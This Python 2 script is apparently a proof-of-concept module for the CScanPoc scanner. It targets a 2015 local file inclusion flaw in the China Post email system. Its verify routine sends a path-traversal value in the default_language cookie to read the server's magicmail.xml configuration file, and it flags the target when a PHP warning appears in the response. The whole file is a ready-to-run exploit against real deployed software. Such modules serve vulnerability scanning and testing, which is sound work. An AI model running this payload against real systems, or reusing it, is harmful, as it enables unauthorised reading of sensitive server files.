# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Ems_0000' # 平台漏洞编号
    name = '中国邮政邮件系统文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        中国邮政邮件系统文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=96474
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = '中国邮政'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '90d0c440-5305-4672-b5c9-72126072951c' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg
            headers = {
                'Cookie':'PHPSESSID=3ace2e3a43f61cec66534415d785f65;default_language=../../.../etc/magicmail.xml'
            }
            response = requests.get(vul_url,headers=headers)
            if response.status_code ==200 and 'Warning' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
